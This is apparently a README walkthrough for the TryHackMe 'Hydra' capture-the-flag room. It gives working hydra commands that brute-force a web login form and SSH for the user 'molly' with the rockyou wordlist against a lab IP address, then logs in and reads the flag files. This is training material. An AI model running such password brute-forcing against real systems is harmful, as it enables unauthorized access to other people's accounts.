# Thm-hydra
walktrough

<h5> Step 1 : </h5>
  <p>check whether hydra is installed or not   </p>

`` hydra --version or hydra --v `` 

<h5>Step 2: </h5>
  <p>locate your  wordlists like passlist.txt  or rockyou.txt files </p>
  <p> usually wordlists are in <b> /usr/share/wordlists  </b> </p>
  
  <h5> Step 3 :</h5>
  use hydra , here you'll get the first flag
  
  ```$hydra -l molly -P rockyou.txt.gz 10.10.177.58 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -f ```

you will ge username and password for the hydra website
login and capture the first flag
  
 ![1677352773538](https://user-images.githubusercontent.com/89000059/221361623-ca5201fe-69c9-42ca-8c23-d006d6504f9b.png)

  
  <h5> Step 4 : </h5>
  
  for 2nd flag you should get ssh connection 
  

``` hydra -l molly -P rockyou.txt.gz 10.10.177.58 ssh ```

you will get a username and password for ssh port

<h5> Step 5 : </h5>
Login to ssh port 

``` ssh molly@10.10.177.58 ```
-> it will ask for password 
->enter the password you got in the step 4 


<h5>Step 6 : </h5>

```ls```


![flag 2](https://user-images.githubusercontent.com/89000059/221361487-47f20586-9ac2-4810-989f-4cdd0da72cfb.png)


<h5>Step 7:</h5>


``` cat flag2.txt```








